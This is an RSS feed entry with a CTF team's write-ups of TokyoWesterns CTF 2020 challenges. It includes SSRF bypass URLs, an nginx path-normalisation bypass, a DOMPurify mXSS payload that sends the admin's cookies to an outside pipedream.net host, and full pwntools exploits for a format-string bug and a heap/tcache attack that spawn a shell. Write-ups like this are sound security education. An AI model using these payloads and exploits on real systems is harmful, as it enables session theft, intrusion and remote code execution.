<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>tokyowesterns-ctf on Black Bauhinia</title>
    <link>https://b6a.black/tags/tokyowesterns-ctf/</link>
    <description>Black Bauhinia (tokyowesterns-ctf)</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en-us</language>
    <lastBuildDate>Fri, 09 Oct 2020 00:53:29 +0800</lastBuildDate>
    
    <atom:link href="https://b6a.black/tags/tokyowesterns-ctf/index.xml" rel="self" type="application/rss+xml" />
    
    
    <item>
      <title>TokyoWesterns CTF 6th 2020 Writeup</title>
      <link>https://b6a.black/posts/2020-09-23-twctf/</link>
      <pubDate>Fri, 09 Oct 2020 00:53:29 +0800</pubDate>
      
      <guid>https://b6a.black/posts/2020-09-23-twctf/</guid>
      <description>&lt;h2 id=&#34;urlcheck-v1-web-98-points&#34;&gt;urlcheck v1 (Web, 98 points)&lt;/h2&gt;

&lt;p&gt;Solved by &lt;em&gt;Ozetta&lt;/em&gt;.&lt;/p&gt;

&lt;p&gt;Objective: SSRF &lt;code&gt;http://127.0.0.1/admin-status&lt;/code&gt;
The input needs to fulfil the pattern &lt;code&gt;&#39;\A(\d+)\.(\d+)\.(\d+)\.(\d+)\Z&#39;&lt;/code&gt; and the first octet cannot be 0 or 127, and some other patterns for internal IP addresses. For some reason, &lt;code&gt;int(&amp;quot;0177&amp;quot;)&lt;/code&gt; is still 177 instead of 127 in Python, so we can use &lt;code&gt;http://0177.0.0.1/admin-status&lt;/code&gt;&lt;/p&gt;

&lt;h2 id=&#34;urlcheck-v2-web-128-points&#34;&gt;urlcheck v2 (Web, 128 points)&lt;/h2&gt;

&lt;p&gt;Solved by &lt;em&gt;Ozetta&lt;/em&gt;.&lt;/p&gt;

&lt;p&gt;Objective: SSRF &lt;code&gt;http://localhost/admin-status&lt;/code&gt;
Standard TOCTOU bug, just use DNS rebinding to get access:
&lt;code&gt;http://23bbd91c.7f000001.rbndr.us/admin-status&lt;/code&gt;&lt;/p&gt;

&lt;h2 id=&#34;angular-of-the-universe-part-one-web-139-points&#34;&gt;Angular of the Universe, part one (Web, 139 points)&lt;/h2&gt;

&lt;p&gt;Solved by &lt;em&gt;Ozetta&lt;/em&gt;.&lt;/p&gt;

&lt;p&gt;Objective of flag 1 is to access &lt;code&gt;/debug/answer&lt;/code&gt; route in Angular through the nginx proxy, but &lt;code&gt;debug&lt;/code&gt; is filtered and &lt;code&gt;/debug&lt;/code&gt; is blocked in nginx.
In nginx, the condition checking is done after path normalization, but the request path is sent to the proxy directly. So &lt;code&gt;/debug/answer/../..&lt;/code&gt; will pass the filter in nginx. To let Angular avoid the latter paths, we can use double slashes, which is used to separate secondary routes. To bypass the checking in &lt;code&gt;server.ts&lt;/code&gt;, use &lt;code&gt;d%65bug&lt;/code&gt; instead of &lt;code&gt;debug&lt;/code&gt;. Finally, we need some gibberish at the end of the path to avoid redirect, which gives this payload:
&lt;code&gt;GET /d%65bug/answer//../../a HTTP/1.1&lt;/code&gt;&lt;/p&gt;

&lt;h2 id=&#34;bfnote-web-320-points&#34;&gt;bfnote (Web, 320 points)&lt;/h2&gt;

&lt;p&gt;Solved by &lt;em&gt;harrier&lt;/em&gt; and &lt;em&gt;Ozetta&lt;/em&gt;.&lt;/p&gt;

&lt;p&gt;During the CTF, cure53 has attempted to patch a mXSS. In particular, the test case in the commit contains a valid payload exploiting the older versions of DOMPurify: &lt;a href=&#34;https://github.com/cure53/DOMPurify/commit/02724b8eb048dd219d6725b05c3000936f11d62d#diff-f44bc3a1bfaa31000b8f4f1359dba82aR1085&#34;&gt;&lt;code&gt;&amp;lt;math&amp;gt;&amp;lt;mtext&amp;gt;&amp;lt;table&amp;gt;&amp;lt;mglyph&amp;gt;&amp;lt;style&amp;gt;&amp;lt;math&amp;gt;CLICKME&amp;lt;/math&amp;gt;&lt;/code&gt;&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;Eventually we have constructed the following payload to steal cookies from the admin:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;lt;math&amp;gt;&amp;lt;mtext&amp;gt;&amp;lt;table&amp;gt;&amp;lt;mglyph&amp;gt;&amp;lt;style&amp;gt;&amp;lt;math&amp;gt;&amp;lt;img src=//7a58976474871f9e062175cbd8755cbc.m.pipedream.net/q onerror=location=this.src+document.cookie&amp;gt;&amp;lt;/math&amp;gt;&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;nothing-more-to-say-2020-pwn-111-points&#34;&gt;nothing more to say 2020 (Pwn, 111 points)&lt;/h2&gt;

&lt;p&gt;Solved by &lt;em&gt;cire meat pop&lt;/em&gt;.&lt;/p&gt;

&lt;p&gt;This is a typical challenge on the format string vulnerability. Since NX protection is disabled, it should be possible to overwrite the return address to shellcode that is located on stack. Hence, stack address can be leaked and the return address can be overwritten.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;p &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; remote(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;pwn02.chal.ctf.westerns.tokyo&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;18247&lt;/span&gt;)

&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;fmtp&lt;/span&gt;(payload):

    p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendline(payload)
    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;recvuntil(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;gt; &amp;#39;&lt;/span&gt;)[:&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;]

p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;recvuntil(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;gt; &amp;#34;&lt;/span&gt;)

payload &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;%28$p&amp;#34;&lt;/span&gt;
leak &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; int(fmtp(payload),&lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt;)
stack &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; leak&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0x118&lt;/span&gt;
ret &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; stack&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0x108&lt;/span&gt;
payload &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;%7$s||||&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;p64(stack)
payload &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; fmtstr&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;fmtstr_payload(&lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;, {ret: stack&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;}, write_size&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;byte&amp;#39;&lt;/span&gt;)
fmtp(payload)
payload &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;q&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; asm(shellcraft&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;amd64&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;linux&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sh())
p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendline(payload)

p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;interactive()&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;We have the flag: &lt;code&gt;TWCTF{kotoshi_mo_hazimarimasita_TWCTF_de_gozaimasu}&lt;/code&gt;. Translating via google: &lt;code&gt;This is TWCTF, which has begun&lt;/code&gt;. Where has kotoshi gone?&lt;/p&gt;

&lt;h2 id=&#34;online-nonogram-pwn-252-points&#34;&gt;Online Nonogram (Pwn, 252 points)&lt;/h2&gt;

&lt;p&gt;Solved by &lt;em&gt;cire meat pop&lt;/em&gt;.&lt;/p&gt;

&lt;p&gt;The vulnerability is that we can overwrite the vector pointer to maze chunks.&lt;/p&gt;

&lt;p&gt;First leak heap info, then forge a vector to read the unsortbin pointer. Finally, overwrite free hook with system function by tcache attack and trigger it with &lt;code&gt;/bin/sh&lt;/code&gt;.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;p &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; remote(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;pwn03.chal.ctf.westerns.tokyo&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;22915&lt;/span&gt;)

&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;calc&lt;/span&gt;(off):
    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; int(((off&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;**&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0.5&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;

&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;dele&lt;/span&gt;(index):
    p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendlineafter(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Your input: &amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;3&amp;#39;&lt;/span&gt;)
    p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendlineafter(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Index&amp;#39;&lt;/span&gt;,str(index))
    p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;recvuntil(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Success&amp;#39;&lt;/span&gt;)

&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;add&lt;/span&gt;(title, size, payload):
    p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendlineafter(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Your input: &amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;2&amp;#39;&lt;/span&gt;)
    p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendlineafter(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Title: &amp;#39;&lt;/span&gt;, title)
    p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendlineafter(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Size: &amp;#39;&lt;/span&gt;, str(size))
    p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendafter(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Puzzle: &amp;#39;&lt;/span&gt;, payload)

&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;leakp&lt;/span&gt;(index):
    p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendlineafter(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Your input: &amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;1&amp;#39;&lt;/span&gt;)
    p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendlineafter(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Index&amp;#39;&lt;/span&gt;,str(index))
    p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;recvuntil(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Row&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;s Numbers&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;)
    a &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;recvuntil(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;Column&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;s Numbers&amp;#39;&lt;/span&gt;)[:&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;17&lt;/span&gt;]
    p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendlineafter(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;:&amp;#39;&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;q&amp;#39;&lt;/span&gt;)
    p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;recvuntil(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;invalid choice&amp;#39;&lt;/span&gt;)
    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; a

&lt;span style=&#34;color:#75715e&#34;&gt;# leak heap info&lt;/span&gt;
offset &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x400&lt;/span&gt;
add(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;test2&amp;#39;&lt;/span&gt;, calc(offset), &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\0&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;offset)
leak &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; leakp(&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;replace(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;)[&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;:][::&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;][&lt;span style=&#34;color:#ae81ff&#34;&gt;32&lt;/span&gt;:]
heap &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; int(leak,&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;)
log&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;info(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;leak: {}&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;format(hex(heap)))
target &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; heap&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0x60&lt;/span&gt;
new_heap &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; heap&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0x520&lt;/span&gt;
heap_base &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; heap&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0x11f90&lt;/span&gt;

&lt;span style=&#34;color:#75715e&#34;&gt;# add padding to prevent freed large chunk consolidate with top chunk &lt;/span&gt;
add(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;pad&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x10&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;)
dele(&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;)

&lt;span style=&#34;color:#75715e&#34;&gt;# forge vector and maze chunk&lt;/span&gt;
forged_chunk1 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; new_heap&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0xb0&lt;/span&gt;
forged_chunk2 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; new_heap&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0xe0&lt;/span&gt;
forged &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; flat(new_heap&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0x40&lt;/span&gt;,new_heap&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0x90&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;0x41&lt;/span&gt;)
forged&lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; flat(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, target, target, &lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;0x81&lt;/span&gt;)
forged&lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; flat(&lt;span style=&#34;color:#ae81ff&#34;&gt;0x81&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;, forged_chunk1, forged_chunk2, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x81&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;)
forged&lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; flat(&lt;span style=&#34;color:#ae81ff&#34;&gt;0x81&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; p64(&lt;span style=&#34;color:#ae81ff&#34;&gt;0x81&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;40&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;p64(&lt;span style=&#34;color:#ae81ff&#34;&gt;0x121&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;20&lt;/span&gt;
forged &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; forged&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;ljust(&lt;span style=&#34;color:#ae81ff&#34;&gt;0x400&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\0&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;)
forged&lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; flat(new_heap, new_heap&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0x10&lt;/span&gt;, new_heap&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0x38&lt;/span&gt;)
add(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;forged&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x70&lt;/span&gt;, forged)

&lt;span style=&#34;color:#75715e&#34;&gt;# leak libc info&lt;/span&gt;
p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendlineafter(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Your input: &amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;4&amp;#39;&lt;/span&gt;)
p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;recvuntil(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;0 : &amp;#39;&lt;/span&gt;)
leak &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; u64(p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;recv(&lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\0\0&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;)
libc_base &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; leak&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0x1ebfd0&lt;/span&gt;
log&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;info(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;libc_base: {}&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;format(hex(libc_base)))
p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendlineafter(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Index&amp;#39;&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;-1&amp;#39;&lt;/span&gt;)

&lt;span style=&#34;color:#75715e&#34;&gt;# free overlapped chunk to tcache &lt;/span&gt;
dele(&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;)
add(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;a&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;50&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;a&amp;#39;&lt;/span&gt;)
add(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;whatever&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;30&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;v&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0x48&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;p64(&lt;span style=&#34;color:#ae81ff&#34;&gt;0x81&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;p64(libc_base&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;libc&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;symbols[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;__free_hook&amp;#39;&lt;/span&gt;]))
add(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;whatever&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;30&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;whatever&amp;#39;&lt;/span&gt;)

&lt;span style=&#34;color:#75715e&#34;&gt;# write system to free hook&lt;/span&gt;
add(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;q&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;30&lt;/span&gt;, p64(libc_base&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;libc&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;symbols[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;system&amp;#39;&lt;/span&gt;]))

&lt;span style=&#34;color:#75715e&#34;&gt;# trigger free hook&lt;/span&gt;
p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendlineafter(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Your input: &amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;2&amp;#39;&lt;/span&gt;)
p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendlineafter(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Title: &amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;/bin/sh&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x00&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\0&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0x100&lt;/span&gt;)

p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;interactive()&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Flag: &lt;code&gt;TWCTF{watashi_puzzle_daisuki_mainiti_yatteru}&lt;/code&gt;.
